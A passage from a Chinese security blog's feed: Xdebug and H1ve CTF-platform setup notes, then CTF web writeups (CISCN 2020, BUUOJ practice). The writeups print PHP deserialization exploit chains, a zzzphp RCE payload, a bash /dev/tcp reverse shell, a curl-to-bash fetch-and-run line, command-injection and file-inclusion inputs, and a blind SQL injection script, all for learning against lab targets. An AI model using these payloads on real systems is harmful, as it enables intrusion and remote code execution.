alt="image-20210123224346250">，</p><p>这里要注意</p><p><strong>1.remote_host要填win10的wsl的ip，wsl不能直接通过localhost访问win10的端口</strong></p><p><strong>2.在win10防火墙的出站规则中把公用域的两个配置改成允许连接</strong></p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123232107298.png" alt="image-20210123232107298"></p><p>太草了，不是这个xdebug.log一辈子翻不了案</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123222005027.png" alt="image-20210123222005027"></p><h3 id="PHPSTORM添加运行环境"><a href="#PHPSTORM添加运行环境" class="headerlink" title="PHPSTORM添加运行环境"></a>PHPSTORM添加运行环境</h3><p>这里的配置和上面一样，我就贴个图把</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123222129044.png" alt="image-20210123222129044"></p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123222154726.png" alt="image-20210123222154726"></p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123222219179.png" alt="image-20210123222219179"></p><p>运行 监听 浏览器开启xdebug</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123222337715.png" alt="image-20210123222337715"></p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123222355580.png" alt="image-20210123222355580"></p><p>心累- -！</p><p>还有个问题就是每次重启后win10的wsl网域会变化，所以xdebug的配置也要跟着变化</p><p>这里可以考虑把wsl设置为静态IP，但我的解决方案是写个脚本修改xdebug的配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">ip=$(cat /etc/resolv.conf | grep nameserver |awk <span class="string">'&#123;print $2&#125;'</span>)</span><br><span class="line"><span class="comment">#echo $ip</span></span><br><span class="line">sudo sed -i  <span class="string">"/^xdebug.remote_host/cxdebug.remote_host=<span class="variable">$ip</span>"</span> /etc/php/5.6/cli/php.ini</span><br></pre></td></tr></table></figure><p>另外一个解决办法是在php.ini</p><p>添加 <code>xdebug.remote_connect_back = 1</code> //如果开启，将忽略 xdebug.remote_host 的参数。它会根据访问的ip直接回连</p>]]></content>
    
    <summary type="html">
    
      配置php代码审计的环境，挺折磨的！
    
    </summary>
    
    
      <category term="环境搭建" scheme="https://0xcreed.jxustctf.top/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="调试" scheme="https://0xcreed.jxustctf.top/tags/%E8%B0%83%E8%AF%95/"/>
    
      <category term="phpstorm" scheme="https://0xcreed.jxustctf.top/tags/phpstorm/"/>
    
  </entry>
  
  <entry>
    <title>H1ve搭建问题</title>
    <link href="https://0xcreed.jxustctf.top/2021/01/H1ve%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98/"/>
    <id>https://0xcreed.jxustctf.top/2021/01/H1ve%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98/</id>
    <published>2021-01-07T06:58:00.000Z</published>
    <updated>2021-01-19T12:41:10.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="1-找不到PWD"><a href="#1-找不到PWD" class="headerlink" title="1.找不到PWD"></a>1.找不到PWD</h3><p><img src="/2021/01/H1ve搭建问题/image-20210107150823208.png" alt="image-20210107150823208"></p><p>H1ve的版本是1.1.3</p><p>使用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker-compose</span> <span class="selector-tag">-f</span> <span class="selector-tag">single</span><span class="selector-class">.yml</span> <span class="selector-tag">up</span></span><br></pre></td></tr></table></figure><p><img src="/2021/01/H1ve搭建问题/image-20210107151152146.png" alt="image-20210107151152146"></p><p>这里警告PWD未定义，所以我们在项目下创建<code>.env</code>定义一下就行</p><p><img src="/2021/01/H1ve搭建问题/image-20210107151304373.png" alt="image-20210107151304373"></p><h3 id="2-访问过慢"><a href="#2-访问过慢" class="headerlink" title="2.访问过慢"></a>2.访问过慢</h3><p>这个问题其实是个css文件引起的，引用的这个css文件的域名被墙了 - -！</p><p>导致这个问题后面偶然才发现的</p><p><img src="/2021/01/H1ve搭建问题/image-20210107153325242.png" alt="image-20210107153325242"></p><p>我的解决办法是把<code>all.css</code>下载下来放到服务器上，再修改引用的URL</p><a id="more"></a><p><img src="/2021/01/H1ve搭建问题/image-20210107153828399.png" alt="image-20210107153828399"></p><p>然后修改fontawesome-fonts.css </p><p><img src="/2021/01/H1ve搭建问题/image-20210107154100385.png" alt="image-20210107154100385"></p><p><img src="/2021/01/H1ve搭建问题/image-20210107154343809.png" alt="image-20210107154343809"></p><h3 id="3-redis缓存不释放，页面500"><a href="#3-redis缓存不释放，页面500" class="headerlink" title="3.redis缓存不释放，页面500"></a>3.redis缓存不释放，页面500</h3><p>这个bug官方还没修复，所以只能自己修复</p><p>利用这个工具清理过期的redis缓存<a href="https://github.com/emacsist/redis-con-release" target="_blank" rel="noopener">https://github.com/emacsist/redis-con-release</a></p><p>但是这个工具是一天清除一次，本来想重写build的，但是有些包丢失了</p><p>所以就写了个脚本</p><p>kill.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        <span class="built_in">cd</span> / &amp;&amp; timeout 5 ./app-linux-amd64 &amp;&amp; sleep 600</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>获取容器id</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker container <span class="keyword">ps</span> |<span class="keyword">grep</span> redis</span><br></pre></td></tr></table></figure><p><img src="/2021/01/H1ve搭建问题/image-20210107155615543.png" alt="image-20210107155615543"></p><p>把工具、脚本复制到容器</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="keyword">cp</span> ./app-linux-amd64   <span class="number">1</span>dc:/</span><br><span class="line">sudo docker <span class="keyword">cp</span> ./app.json  <span class="number">1</span>dc:/</span><br><span class="line">sudo docker <span class="keyword">cp</span> ./kill.<span class="keyword">sh</span>   <span class="number">1</span>dc:/</span><br></pre></td></tr></table></figure><p>进入容器，执行脚本</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker exec -it 1dc  <span class="string">/bin/bash</span></span><br><span class="line"><span class="keyword">cd</span> /</span><br><span class="line">nohup <span class="string">./kill.sh</span> &amp;</span><br></pre></td></tr></table></figure><p>当然脚本也可以根据需求修改</p>]]></content>
    
    <summary type="html">
    
      记录下搭建H1ve时遇到的问题
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="CTF平台" scheme="https://0xcreed.jxustctf.top/tags/CTF%E5%B9%B3%E5%8F%B0/"/>
    
  </entry>
  
  <entry>
    <title>第十三届全国大学生信息安全竞赛初赛Writeup</title>
    <link href="https://0xcreed.jxustctf.top/2020/08/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/"/>
    <id>https://0xcreed.jxustctf.top/2020/08/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/</id>
    <published>2020-08-24T01:06:46.000Z</published>
    <updated>2020-08-24T07:46:08.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h3><p>扫目录拿源码</p><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200824112713676.png" alt="image-20200824112713676"></p><p>wmctf2020 <a href="http://blog.ccreater.top/2020/08/04/wmctf2020/#webweb" target="_blank" rel="noopener">webweb的原题</a>，直接用exp打</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line">  <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span> <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span>&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">Mapper</span> <span class="title">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span>&#123;</span><br><span class="line">    <span class="title">protected</span></span><br><span class="line">      $<span class="title">props</span>=["<span class="title">quotekey</span>"=&gt;"<span class="title">call_user_func</span>"],</span><br><span class="line">      $<span class="title">adhoc</span>=["<span class="title">phpinfo</span>"=&gt;["<span class="title">expr</span>"=&gt;""]],</span><br><span class="line">      $<span class="title">db</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span><span class="params">($offset)</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span><span class="params">($offset)</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span><span class="params">($offset, $value)</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span><span class="params">($offset)</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($val)</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;db = $val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">    <span class="title">protected</span> $<span class="title">server</span>="";</span><br><span class="line">    <span class="keyword">public</span> $events;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;events=[<span class="string">"disconnect"</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="string">""</span>)),<span class="string">"find"</span>)];</span><br><span class="line">      <span class="keyword">$this</span>-&gt;server=&amp;<span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">  <span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">array</span>(<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">WS</span>(),<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">Agent</span>())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p><a href="https://www.gem-love.com/ctf/2569.html#babyunserialize" target="_blank" rel="noopener">y1ng师傅</a>是全局搜索<code>__destruct()</code>，在jig.php发现了任意写，于是直接gethell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jig</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span></span><br><span class="line">        FORMAT_JSON=<span class="number">0</span>,</span><br><span class="line">        FORMAT_Serialized=<span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span></span><br><span class="line">        <span class="comment">//! Storage location</span></span><br><span class="line">        $dir = <span class="string">'/var/www/html/'</span>,</span><br><span class="line">        <span class="comment">//! Current storage format</span></span><br><span class="line">        $format = <span class="keyword">self</span>::FORMAT_JSON,</span><br><span class="line">        <span class="comment">//! Jig log</span></span><br><span class="line">        $data = <span class="keyword">array</span>(<span class="string">"info.php"</span>=&gt;<span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="string">"&lt;?php phpinfo();?&gt;"</span>)),</span><br><span class="line">        <span class="comment">//! lazy load/save files</span></span><br><span class="line">        $lazy = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">$jig = <span class="keyword">new</span> Jig();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($jig));</span><br></pre></td></tr></table></figure><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'could not fork'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">        $r=pcntl_wait($status);</span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])&amp;&amp;is_string($_GET[<span class="string">'a'</span>])&amp;&amp;!preg_match(<span class="string">"/[:\\\\]|exec|pcntl/i"</span>,$_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">            call_user_func_array($_GET[<span class="string">'a'</span>],[$_GET[<span class="string">'b'</span>],<span class="keyword">false</span>,<span class="keyword">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>php多进程，主进程会等待子进程运行结束，子进程异常退出会触发<code>phpinfo()</code>。<br>直接拿php函数列表fuzz。</p><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/easyphp.jpg" alt="easyphp"></p><p>以上函数均可导致子进程异常退出，随便找一个即可。</p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">a</span>=fsockopen&amp;b=123</span><br></pre></td></tr></table></figure><p>本来想自己fuzz一下的，但环境没了。</p><h3 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h3><p>要求两个变量长度不能超过5，但md5的值又要相同，而且强弱比较也不能相同</p><p>考脑洞</p><p>利用php预定义常量绕过</p><p>比如 M_PI,M_E ,INF,M_LN2</p><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200821142717774.png" alt="image-20200821142717774"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $trick1=INF;</span><br><span class="line"><span class="keyword">public</span> $trick2=INF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> trick()) );</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">trick=O%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>trick%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>trick1%<span class="number">22</span>%<span class="number">3</span>Bd%<span class="number">3</span>AINF%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>t</span><br><span class="line">rick2%<span class="number">22</span>%<span class="number">3</span>Bd%<span class="number">3</span>AINF%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h3 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h3><p>在<code>/DeveloperControlPanel</code>路由中发现</p><p>if(Admin[key] === password) 才能得到flag</p><p>在 <code>/Privilege</code>下，利用setFn设置值</p><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200821144143013.png" alt="image-20200821144143013"></p><p>然后找了下set-value的漏洞，发现一个原型链污染</p><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200821143721692.png" alt="image-20200821143721692"></p><p>而3.0.0 正好收到影响</p><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200820173333614.png" alt="image-20200820173333614"></p><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200820173350849.png" alt="image-20200820173350849"></p><h3 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h3><h3 id="rceme-1"><a href="#rceme-1" class="headerlink" title="rceme"></a>rceme</h3><p>zzzphp的一个命令执行的漏洞，但<code>danger_key()</code> 增加了一个<code>htmlspecialchars()</code>函数导致原本的payload失效</p><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200821144836357.png" alt="image-20200821144836357"></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 正则过滤绕过：</span><br><span class="line">  很容易看懂，格式为&#123;<span class="variable"><span class="keyword">if</span></span>:<span class="variable">payload</span>&#125;&#123;<span class="variable">end</span> <span class="variable"><span class="keyword">if</span></span>&#125;，可利用的地方在<span class="variable">payload</span>处。</span><br><span class="line"><span class="number">2</span>. 字符串过滤绕过：</span><br><span class="line">  <span class="function"><span class="title">hex2bin</span>(<span class="title">dechex</span>(<span class="variable">xxx</span>)).hex2bin(<span class="title">dechex</span>(<span class="variable">xxx</span>))</span></span><br><span class="line"><span class="number">3</span>. 拼接字符串执行命令</span><br><span class="line">  简单来说就是闭合<span class="variable"><span class="keyword">if</span></span>语句。</span><br></pre></td></tr></table></figure><p>根据之前的题目，直接构造phpinfo</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;<span class="keyword">if</span>:<span class="number">1</span>)(hex2bin(dechex(<span class="number">112</span>)).hex2bin(dechex(<span class="number">104</span>)).hex2bin(dechex(<span class="number">112</span>)).hex2bin(dechex(<span class="number">105</span>)).hex2bin(dechex(<span class="number">110</span>)).hex2bin(dechex(<span class="number">102</span>)).hex2bin(dechex(<span class="number">111</span>)))();die();<span class="comment">//&#125;&#123;end%20if&#125;</span></span><br></pre></td></tr></table></figure><p>也有师傅用反引号绕过</p><p>起一个http服务器，写入反弹shell命令。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c 'bash -i &gt;/dev/tcp/ip/port <span class="number">0</span>&gt;&amp;<span class="number">1</span>'</span><br></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="string">?a</span>=&#123;<span class="symbol">if:</span><span class="string">`curl ip:port/x |bash`</span>&#125;&#123;<span class="keyword">end</span>+<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200824154556091.png" alt="image-20200824154556091"></p>]]></content>
    
    <summary type="html">
    
      最近比赛多，没时间写博客。今天补上顺带学学其他师傅的姿势(ง •_•)ง
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="WEB" scheme="https://0xcreed.jxustctf.top/tags/WEB/"/>
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>8月刷题记录</title>
    <link href="https://0xcreed.jxustctf.top/2020/08/8%E6%9C%88%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://0xcreed.jxustctf.top/2020/08/8%E6%9C%88%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-08-02T10:15:31.000Z</published>
    <updated>2021-03-22T08:05:46.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>伪协议加文件包含</p><p><code>?file=php://filter/read/convert.base64-encode/resource=flag.php</code></p><h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p>命令执行</p><p><code>127.0.0.1;cat /flag</code></p><h3 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h3><a id="more"></a><p>看题目直接扫目录</p><p><img src="/2020/08/8月刷题记录/image-20200802182510227.png" alt="image-20200802182510227"></p><p><img src="/2020/08/8月刷题记录/image-20200802182531380.png" alt="image-20200802182531380"></p><p>弱类型比较</p><p><code>?key=123</code></p><h3 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h3><p>phtml绕过</p><p><img src="/2020/08/8月刷题记录/image-20200802184054101.png" alt="image-20200802184054101"></p><p><img src="/2020/08/8月刷题记录/image-20200802184125661.png" alt="image-20200802184125661"></p><h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>过滤了union、and、or、空格等，包括<code>/**/</code></p><p>输入<code>1/1</code>时会正常返回结果，可以判断这是数字型的sql注入。</p><p>可以用<code>()</code>绕过空白符</p><p>payload</p><p><code>if(ascii(substr((select(flag)from(flag)),1,1))=ascii(&#39;f&#39;),1,2)</code></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://1bc1fd51-0f6f-43b5-bd9e-c19e86a6e238.node3.buuoj.cn/index.php'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,2)"</span>.format(x, mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"id"</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    result += chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        